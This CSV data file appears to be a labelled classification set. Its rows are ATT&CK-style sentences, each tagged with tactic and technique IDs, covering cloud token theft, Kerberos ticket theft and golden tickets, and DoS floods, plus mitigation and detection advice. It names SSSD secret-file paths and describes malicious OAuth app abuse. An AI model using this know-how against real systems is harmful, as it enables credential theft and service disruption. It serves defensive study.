"Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.",TA0006,T1528
"In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens.",TA0006,T1528
"If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.",TA0006,T1528
"Token theft can also occur through social engineering, in which case user action may be required to grant access.",TA0006,T1528
An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols.,TA0006,T1528
An example commonly-used sequence is Microsoft's Authorization Code Grant flow.,TA0006,T1528
An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.,TA0006,T1528
Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.,TA0006,T1528
"The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.",TA0006,T1528
"Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application.",TA0006,T1528
"Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token.",TA0006,T1528
"Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token.",TA0006,T1528
"However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.",TA0006,T1528
AADInternals can steal users’ access tokens via phishing emails containing malicious links.,TA0006,T1528
"APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as ""Google Defender"" ""Google Email Protection,"" and ""Google Scanner"" for Gmail users.",TA0006,T1528

Peirates gathers Kubernetes service account tokens using a variety of techniques.,TA0006,T1528
Administrators should audit all cloud and container accounts to ensure that they are necessary and that the permissions granted to them are appropriate.,TA0006,T1528
"Additionally, administrators should perform an audit of all OAuth applications and the permissions they have been granted to access organizational data.",TA0006,T1528
"This should be done extensively on all applications in order to establish a baseline, followed up on with periodic audits of new or updated applications.",TA0006,T1528
Suspicious applications should be investigated and removed.,TA0006,T1528
"Administrators can block end-user consent to OAuth applications, disabling users from authorizing third-party apps through OAuth 2.0 and forcing administrative consent for all requests.",TA0006,T1528
"They can also block end-user registration of applications by their users, to reduce risk.",TA0006,T1528
A Cloud Access Security Broker can also be used to ban applications.,TA0006,T1528
Azure offers a couple of enterprise policy settings in the Azure Management Portal that may help:,TA0006,T1528
"""Users -> User settings -> App registrations: Users can register applications"" can be set to ""no"" to prevent users from registering new applications.",TA0006,T1528
"""Enterprise applications -> User settings -> Enterprise applications: Users can consent to apps accessing company data on their behalf"" can be set to ""no"" to prevent users from consenting to allow third-party multi-tenant applications",TA0006,T1528
Enforce role-based access control to limit accounts to the least privileges they require.,TA0006,T1528
A Cloud Access Security Broker (CASB) can be used to set usage policies and manage user permissions on cloud applications to prevent access to application access tokens.,TA0006,T1528
"In Kubernetes applications, set ""automountServiceAccountToken: false"" in the YAML specification of pods that do not require access to service account tokens.",TA0006,T1528
Users need to be trained to not authorize third-party applications they don’t recognize.,TA0006,T1528
"The user should pay particular attention to the redirect URL: if the URL is a misspelled or convoluted sequence of words related to an expected service or SaaS application, the website is likely trying to spoof a legitimate service.",TA0006,T1528
Users should also be cautious about the permissions they are granting to apps.,TA0006,T1528
"For example, offline access and access to read emails should excite higher suspicions because adversaries can utilize SaaS APIs to discover credentials and other sensitive communications.",TA0006,T1528
Administrators should set up monitoring to trigger automatic alerts when policy criteria are met.,TA0006,T1528
"For example, using a Cloud Access Security Broker (CASB), admins can create a ""High severity app permissions"" policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.)",TA0006,T1528
"For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old ""Last authorized"" fields.",TA0006,T1528
"A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user.",TA0006,T1528
App stores can be useful resources to further investigate suspicious apps.Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access.,TA0006,T1528
"For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.",TA0006,T1528
Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket.,TA0006,T1558
Kerberos is an authentication protocol widely used in modern Windows domain environments.,TA0006,T1558
"In Kerberos environments, referred to as ""realms"", there are three basic participants: client, service, and Key Distribution Center (KDC).",TA0006,T1558
"Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated.",TA0006,T1558
The KDC is responsible for both authentication and ticket granting.,TA0006,T1558
Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.,TA0006,T1558
"On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.",TA0006,T1558
"Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"".",TA0006,T1558
The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.,TA0006,T1558
"On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets.",TA0006,T1558
By default SSSD maintains a copy of the ticket database that can be found in /var/lib/sss/secrets/secrets.ldb as well as the corresponding key located in /var/lib/sss/secrets/.secrets.mkey.,TA0006,T1558
Both files require root access to read.,TA0006,T1558
"If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket.",TA0006,T1558
The ccache file may also be converted into a Windows format using tools such as Kekeo.,TA0006,T1558
"Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux.",TA0006,T1558
"By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access.",TA0006,T1558
The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon.,TA0006,T1558
"Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework.",TA0006,T1558
Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.,TA0006,T1558
"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.Monitor the lifetime of TGT tickets for values that differ from the default domain duration.",TA0006,T1558

"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.",TA0006,T1558.001
Golden tickets enable adversaries to generate authentication material for any account in Active Directory.,TA0006,T1558.001
"Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources.",TA0006,T1558.001
Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.,TA0006,T1558.001
The KDC service runs all on domain controllers that are part of an Active Directory domain.,TA0006,T1558.001
KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.,TA0006,T1558.001

"A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).",TA0040,T1499
"To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.",TA0040,T1499
"Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection.",TA0040,T1499
This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.,TA0040,T1499
Botnets are commonly used to conduct DDoS attacks against networks and services.,TA0040,T1499
Large botnets can generate a significant amount of traffic from systems spread across the global internet.,TA0040,T1499
Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack.,TA0040,T1499
"In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources.",TA0040,T1499
"In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult.",TA0040,T1499
"Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.",TA0040,T1499
"In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume.",TA0040,T1499

A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity.,TA0040,T1499.001
These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.,TA0040,T1499.001
"Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.",TA0040,T1499.001
"With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed.",TA0040,T1499.001
"Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.",TA0040,T1499.001
ACK floods leverage the stateful nature of the TCP protocol.,TA0040,T1499.001
A flood of ACK packets are sent to the target.,TA0040,T1499.001
This forces the OS to search its state table for a related TCP connection that has already been established.,TA0040,T1499.001
"Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists.",TA0040,T1499.001
